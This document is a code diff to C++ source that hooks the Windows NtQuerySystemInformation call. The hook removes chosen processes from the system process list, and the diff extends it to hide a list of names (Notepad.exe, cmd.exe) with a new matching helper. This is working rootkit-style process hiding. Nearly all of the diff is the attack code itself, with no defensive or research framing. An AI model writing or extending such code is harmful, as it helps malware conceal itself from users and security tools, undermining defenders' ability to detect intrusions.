@@ -6,10 +6,15 @@
 #include <Windows.h>
 #include <string>
 #include <string.h>
+#include <vector>
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
-std::string procName = "Notepad.exe";
+std::vector<std::string> procNames = {
+    "Notepad.exe",
+    "cmd.exe"
+
+};
 
 typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
     __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -19,6 +24,17 @@ typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
     );
 
 PNT_QUERY_SYSTEM_INFORMATION origNtQuerySysInfo = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
+
+bool ShouldHideProcess(const wchar_t* processName, size_t length) {
+    for (const auto& procName : procNames) {
+        std::wstring wProcName(procName.begin(), procName.end());
+        if (wcsncmp(processName, wProcName.c_str(), length / sizeof(wchar_t)) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
+
 NTSTATUS WINAPI hookNtQuerySysInfo(
     __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
     __inout PVOID SystemInformation,
@@ -34,7 +50,9 @@ NTSTATUS WINAPI hookNtQuerySysInfo(
         while (pCurrent->NextEntryOffset != 0) {
             SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            if (wcsncmp(pNext->ImageName.Buffer, std::wstring(procName.begin(), procName.end()).c_str(), pNext->ImageName.Length) == 0) {
+            if (pNext->ImageName.Buffer != nullptr &&
+                ShouldHideProcess(pNext->ImageName.Buffer, pNext->ImageName.Length)) {
+
                 pCurrent->NextEntryOffset += pNext->NextEntryOffset;
             }
             else {
@@ -42,6 +60,7 @@ NTSTATUS WINAPI hookNtQuerySysInfo(
             }
         }
     }
+
     return status;
 }
 
